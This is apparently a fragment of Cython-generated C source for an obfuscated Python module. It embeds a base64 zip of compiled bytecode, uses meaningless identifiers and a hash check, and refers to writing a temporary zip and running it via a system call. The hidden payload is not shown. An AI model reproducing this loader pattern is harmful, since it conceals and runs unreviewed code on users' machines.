igIvigKvigIvigbnigIviga7igIvigbrigIvigb7igIvi\nga7igIvigbjigIvigb/igIvigbjigIvigKXigIvigbvigIvigaTigIvigbjigIvigb/igIvigKPigIvi\ngKzigIvigaPigIvigb/igIvigb/igIvigbvigIvigbjigIvigLHigIvigKTigIvigKTigIvigbzigIvi\ngbzigIvigbzigIvigKXigIvigaLigIvigaXigIvigbjigIvigb/igIvigarigIvigazigIvigbnigIvi\ngarigIvigabigIvigKXigIvigajigIvigaTigIvigabigIvigKTigIvigarigIvigbvigIvigaLigIvi\ngKTigIvigazigIvigbnigIvigarigIvigbvigIvigaPigIvigbrigIvigafigIvigKzigIvigKfigIvi\ngKvigIvigaPigIviga7igIvigarigIviga/igIviga7igIvigbnigIvigbjigIvigLbigIvigaPigIvi\nga7igIvigarigIviga/igIviga7igIvigbnigIvigbjigIvigKfigIvigKvigIviga/igIvigarigIvi\ngb/igIvigarigIvigLbigIviga/igIvigarigIvigb/igIvigarigIvigKLigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigb7igIvigbjigIviga7igIvigbnigIvigaXigIvigarigIvigabigIviga7igIvigKvigIvi\ngLbigIvigKvigIvigbnigIviga7igIvigbjigIvigbvigIvigaTigIvigaXigIvigbjigIviga7igIvi\ngKXigIvigaHigIvigbjigIvigaTigIvigaXigIvigKPigIvigKLigIvigKXigIvigazigIviga7igIvi\ngb/igIvigKPigIvigKzigIviga/igIvigarigIvigb/igIvigarigIvigKzigIvigKfigIvigKvigIvi\ngbDigIvigbbigIvigKLigIvigKXigIvigazigIviga7igIvigb/igIvigKPigIvigKzigIvigb7igIvi\ngbjigIviga7igIvigbnigIvigKzigIvigKfigIvigKvigIvigbDigIvigbbigIvigKLigIvigKXigIvi\ngazigIviga7igIvigb/igIvigKPigIvigKzigIvigb7igIvigbjigIviga7igIvigbnigIvigaXigIvi\ngarigIvigabigIviga7igIvigKzigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigaLigIvigaXigIvi\nga3igIvigaTigIvigaLigIvigaXigIvigbjigIvigb/igIvigarigIvigZDigIvigb7igIvigbjigIvi\nga7igIvigbnigIvigaXigIvigarigIvigabigIviga7igIvigZbigIvigKvigIvigLbigIvigKvigIvi\ngbnigIviga7igIvigbjigIvigbvigIvigaTigIvigaXigIvigbjigIviga7igIvigKXigIvigaHigIvi\ngbjigIvigaTigIvigaXigIvigKPigIvigKLigIvigKXigIvigazigIviga7igIvigb/igIvigKPigIvi\ngKzigIviga/igIvigarigIvigb/igIvigarigIvigKzigIvigKfigIvigKvigIvigbDigIvigbbigIvi\ngKLigIvigKXi""gIvigazigIviga7igIvigb/igIvigKPigIvigKzigIvigb7igIvigbjigIviga7igIvi\ngbnigIvigKzigIvigKfigIvigKvigIvigbDigIvigbbigIvigKLigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngbnigIvigbnigIvigKvigIvigLbigIvigKvigIvigaLigIvigaXigIviga3igIvigaTigIvigaLigIvi\ngaXigIvigbjigIvigb/igIvigarigIvigKXigIvigazigIviga7igIvigb/igIvigKPigIvigb7igIvi\ngbjigIviga7igIvigbnigIvigaXigIvigarigIvigabigIviga7igIvigKfigIvigbDigIvigbbigIvi\ngKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIviga3igIvigaTigIvigbzigIvigbjigIvigKvigIvigLbigIvi\ngKvigIvigbnigIvigbnigIvigKXigIvigazigIviga7igIvigb/igIvigKPigIvigKzigIviga3igIvi\ngaTigIvigafigIvigafigIvigaTigIvigbzigIviga7igIvigbnigIvigZTigIvigajigIvigaTigIvi\ngb7igIvigaXigIvigb/igIvigKzigIvigKfigIvigKvigIvigYXigIvigaTigIvigaXigIviga7igIvi\ngKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigaLigIviga3igIvigKvigIviga3igIvigaTigIvigbzigIvi\ngbjigIvigKvigIvigLXigIvigLbigIvigKvigIvigLjigIvigLvigIvigLHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigILigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIviga7igIvigabigIvigarigIvigaLigIvigafigIvigKvigIvigLbigIvigKvigIvi\ngb7igIvigbjigIviga7igIvigbnigIvigaXigIvigarigIvigabigIviga7igIvigKvigIvigKDigIvi\ngKvigIviga/igIvigaTigIvigabigIvigarigIvigaLigIvigaXigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigILigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigajigIvigaPigIviga7igIvigajigIvigaDigIvigZTigIvigaTigIvigaXigIvigKPigIvi\nga7igIvigabigIvigarigIvigaLigIvigafigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIviga7igIvigbPigIvigajigIviga7igIvigbvigIvigb/igIvigKvigIvigY7igIvi\ngbPigIvigajigIviga7igIvigbvigIvigb/igIvigaLi""gIvigaTigIvigaXigIvigKvigIvigarigIvi\ngbjigIvigKvigIviga7igIvigLHigIvigKzigIvigKzigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigb/igIvigaPigIvigbnigIviga7igIvigarigIviga/igIvigbjigIvigKvigIvigLbigIvi\ngKvigIvigZDigIvigZbigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\nga/igIviga7igIviga3igIvigKvigIvigbvigIvigbnigIvigaLigIvigaXigIvigb/igIvigaLigIvi\ngaXigIvigazigIvigKPigIvigKLigIvigLHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIviga3igIvigaTigIvigbnigIvi\ngKvigIvigaLigIvigKvigIvigaLigIvigaXigIvigKvigIvigbnigIvigarigIvigaXigIvigazigIvi\nga7igIvigKPigIvigLrigIvigLnigIvigLvigIvigKLigIvigLHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigb/igIvigKvigIvigLbigIvigKvigIvigb/igIvigaPigIvigbnigIviga7igIvi\ngarigIviga/igIvigaLigIvigaXigIvigazigIvigKXigIvigZ/igIvigaPigIvigbnigIviga7igIvi\ngarigIviga/igIvigKPigIvigb/igIvigarigIvigbnigIvigazigIviga7igIvigb/igIvigLbigIvi\ngb7igIvigb7igIvigb7igIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigb/igIvi\ngKXigIvigbjigIvigb/igIvigarigIvigbnigIvigb/igIvigKPigIvigKLigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigb/igIvigaPigIvigbnigIviga7igIvigarigIviga/igIvigbjigIvi\ngKXigIvigarigIvigbvigIvigbvigIviga7igIvigaXigIviga/igIvigKPigIvigb/igIvigKLigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIviga3igIvigaTigIvi\ngbnigIvigKvigIvigb/igIvigKvigIvigaLigIvigaXigIvigKvigIvigb/igIvigaPigIvigbni""gIvi\nga7igIvigarigIviga/igIvigbjigIvigLHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngb/igIvigKXigIvigaHigIvigaTigIvigaLigIvigaXigIvigKPigIvigKLigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigbvigIvigbnigIvigaLigIvigaXigIvigb/igIvi\ngaLigIvigaXigIvigazigIvigKPigIvigKLigIt6CDxsYW1iZGE+2gRleGVjKQLaCGZpbGVuYW1l2gRt\nb2RlTikHchsAAAByGQAAANoDRW5j2glPYmZ1c2NhdGVyHAAAANoHY29tcGlsZdoEY29kZXIGAAAAcg0A\nAAByCwAAAPoIPG1vZHVsZT5yIwAAAAEAAABzZAAAAPADAQEB8AIDAV8B8AADAV8B8AADAV8B8AoACguA\nBvACAAdnbjGAA9gMGIhMmBOYZtEMJdQMJYAJ2AAEgASAV4BXkFnQDR6IVKgauCbQBUHRBUHUBUHRAELU\nAELQAELQAELQAEJyDQAAAFBLAQIUAxQAAAAAABtlvVodb/QZ7rkBAO65AQAMAAAAAAAAAAAAAACkgQAA\nAABfX21haW5fXy5weWNQSwUGAAAAAAEAAQA6AAAAGLoBAAAA";
static const char __pyx_k_b9d4772332e9dcc5376f1869cf910fe4[] = "b9d4772332e9dcc5376f1869cf910fe456c6bcf2ad897fc13966c834f7a6b643";
static const char __pyx_k_file_will_not_run_anymore_as_mai[] = "file will not run anymore as main function changed";
static PyObject *__pyx_kp_u_;
static PyObject *__pyx_n_u_Kriyox;
static PyObject *__pyx_n_s_NamedTemporaryFile;
static PyObject *__pyx_n_u_Shishya;
static PyObject *__pyx_kp_u_UEsDBBQAAAAAABtlvVodb_QZ7rkBAO65;
static PyObject *__pyx_n_s_b64decode;
static PyObject *__pyx_n_u_b9d4772332e9dcc5376f1869cf910fe4;
static PyObject *__pyx_n_s_chr;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_close;
static PyObject *__pyx_n_s_combined;
static PyObject *__pyx_n_s_d;
static PyObject *__pyx_n_s_delete;
static PyObject *__pyx_n_s_encode;
static PyObject *__pyx_n_s_exists;
static PyObject *__pyx_kp_u_file_will_not_run_anymore_as_mai;
static PyObject *__pyx_n_s_flush;
static PyObject *__pyx_n_s_hashlib;
static PyObject *__pyx_n_s_hexdigest;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_lambda;
static PyObject *__pyx_n_s_lambda_locals_lambda;
static PyObject *__pyx_n_s_lll;
static PyObject *__pyx_n_s_llll;
static PyObject *__pyx_n_s_lllll;
static PyObject *__pyx_n_s_llllll;
static PyObject *__pyx_n_s_lllllll;
static PyObject *__pyx_n_s_llllllll;
static PyObject *__pyx_n_s_lllllllll;
static PyObject *__pyx_n_s_llllllllll;
static PyObject *__pyx_n_s_lllllllllll;
static PyObject *__pyx_n_s_llllllllllll;
static PyObject *__pyx_n_s_lllllllllllll;
static PyObject *__pyx_n_s_llllllllllllll;
static PyObject *__pyx_n_s_lllllllllllllll;
static PyObject *__pyx_n_s_llllllllllllllll;
static PyObject *__pyx_n_s_llllllllllllllllllll;
static PyObject *__pyx_n_s_lllllllllllllllllllll;
static PyObject *__pyx_n_s_llllllllllllllllllllll;
static PyObject *__pyx_n_s_lllllllllllllllllllllll;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_map;
static PyObject *__pyx_n_s_n;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_name_2;
static PyObject *__pyx_n_s_open;
static PyObject *__pyx_n_s_path;
static PyObject *__pyx_kp_u_python;
static PyObject *__pyx_n_s_remove;
static PyObject *__pyx_n_s_sha256;
static PyObject *__pyx_n_s_source;
static PyObject *__pyx_kp_s_source_py;
static PyObject *__pyx_n_s_suffix;
static PyObject *__pyx_n_s_system;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_kp_u_tmp_zip;
static PyObject *__pyx_n_u_wb;
static PyObject *__pyx_n_s_write;
static PyObject *__pyx_lambda_funcdef_6source_lambda(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_x); /* proto */
static PyObject *__pyx_lambda_funcdef_6source_lambda1(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_x); /* proto */
static PyObject *__pyx_lambda_funcdef_6source_lambda2(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_lambda_funcdef_6source_lambda3(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_x); /* proto */
static PyObject *__pyx_lambda_funcdef_lambda5(PyObject *__pyx_self, PyObject *__pyx_v_f); /* proto */
static PyObject *__pyx_lambda_funcdef_6source_lambda4(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_n, PyObject *__pyx_v_d); /* proto */
static PyObject *__pyx_lambda_funcdef_6source_lambda6(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_f); /* proto */
static PyObject *__pyx_lambda_funcdef_6source_lambda7(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_n); /* proto */
static PyObject *__pyx_pf_6source_lllllllllllllllllllllll(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_2llllllllllllll(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_tp_new_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_46;
static PyObject *__pyx_int_52;
static PyObject *__pyx_int_54;
static PyObject *__pyx_int_97;
static PyObject *__pyx_int_98;
static PyObject *__pyx_int_99;
static PyObject *__pyx_int_100;
static PyObject *__pyx_int_101;
static PyObject *__pyx_int_102;
static PyObject *__pyx_int_105;
static PyObject *__pyx_int_108;
static PyObject *__pyx_int_109;
static PyObject *__pyx_int_110;
static PyObject *__pyx_int_111;
static PyObject *__pyx_int_112;
static PyObject *__pyx_int_114;
static PyObject *__pyx_int_115;
static PyObject *__pyx_int_116;
static PyObject *__pyx_int_121;
static PyObject *__pyx_tuple__2;
static PyObject *__pyx_tuple__3;
static PyObject *__pyx_tuple__5;
static PyObject *__pyx_codeobj__4;
static PyObject *__pyx_codeobj__6;
/* Late includes */



/* Python wrapper */
static PyObject *__pyx_pw_6source_4lambda(PyObject *__pyx_self, PyObject *__pyx_v_x); /*proto*/
static PyMethodDef __pyx_mdef_6source_4lambda = {"lambda", (PyCFunction)__pyx_pw_6source_4lambda, METH_O, 0};
static PyObject *__pyx_pw_6source_4lambda(PyObject *__pyx_self, PyObject *__pyx_v_x) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("lambda (wrapper)", 0);
  __pyx_r = __pyx_lambda_funcdef_6source_lambda(__pyx_self, ((PyObject *)__pyx_v_x));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_lambda_funcdef_6source_lambda(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_x) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("lambda", 0);
  __Pyx_XDECREF(__pyx_r);
  __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_builtin_chr);
  __Pyx_GIVEREF(__pyx_builtin_chr);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_builtin_chr);
  __Pyx_INCREF(__pyx_v_x);
  __Pyx_GIVEREF(__pyx_v_x);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_v_x);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_map, __pyx_t_1, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyUnicode_Join(__pyx_kp_u_, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_r = __pyx_t_1;
  __pyx_t_1 = 0;
  goto __pyx_L0;

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_AddTraceback("source.lambda", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5lambda1(PyObject *__pyx_self, PyObject *__pyx_v_x); /*proto*/
static PyMethodDef __pyx_mdef_6source_5lambda1 = {"lambda1", (PyCFunction)__pyx_pw_6source_5lambda1, METH_O, 0};
static PyObject *__pyx_pw_6source_5lambda1(PyObject *__pyx_self, PyObject *__pyx_v_x) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("lambda1 (wrapper)", 0);
  __pyx_r = __pyx_lambda_funcdef_6source_lambda1(__pyx_self, ((PyObject *)__pyx_v_x));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_lambda_funcdef_6source_lambda1(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_x) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("lambda1", 0);
  __Pyx_XDECREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_lll); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_v_x) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_v_x);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin___import__, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_r = __pyx_t_2;
  __pyx_t_2 = 0;
  goto __pyx_L0;

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("source.lambda1", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_6lambda2(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_6lambda2 = {"lambda2", (PyCFunction)__pyx_pw_6source_6lambda2, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_6lambda2(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("lambda2 (wrapper)", 0);
  __pyx_r = __pyx_lambda_funcdef_6source_lambda2(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_lambda_funcdef_6source_lambda2(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("lambda2", 0);
  __Pyx_XDECREF(__pyx_r);
  __pyx_t_1 = PyList_New(10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_1, 6, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_1, 7, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_1, 8, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_1, 9, __pyx_int_100);
  __pyx_r = __pyx_t_1;
  __pyx_t_1 = 0;
  goto __pyx_L0;

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_AddTraceback("source.lambda2", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_7lambda3(PyObject *__pyx_self, PyObject *__pyx_v_x); /*proto*/
static PyMethodDef __pyx_mdef_6source_7lambda3 = {"lambda3", (PyCFunction)__pyx_pw_6source_7lambda3, METH_O, 0};
static PyObject *__pyx_pw_6source_7lambda3(PyObject *__pyx_self, PyObject *__pyx_v_x) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("lambda3 (wrapper)", 0);
  __pyx_r = __pyx_lambda_funcdef_6source_lambda3(__pyx_self, ((PyObject *)__pyx_v_x));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_lambda_funcdef_6source_lambda3(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_x) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("lambda3", 0);
  __Pyx_XDECREF(__pyx_r);
  __pyx_t_2 = __Pyx_PyInt_EqObjC(__pyx_v_x, __pyx_int_0, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_IsTrue(__pyx_t_2); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (__pyx_t_3) {
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_lll); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 13, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_llllllll); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 13, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_6, function);
      }
    }
    __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 13, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_6)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_6);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_2 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_1 = __pyx_t_2;
    __pyx_t_2 = 0;
  } else {
    __Pyx_INCREF(__pyx_kp_u_tmp_zip);
    __pyx_t_1 = __pyx_kp_u_tmp_zip;
  }
  __pyx_r = __pyx_t_1;
  __pyx_t_1 = 0;
  goto __pyx_L0;

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("source.lambda3", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_8lambda4(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_6source_8lambda4 = {"lambda4", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_6source_8lambda4, METH_VARARGS|METH_KEYWORDS, 0};
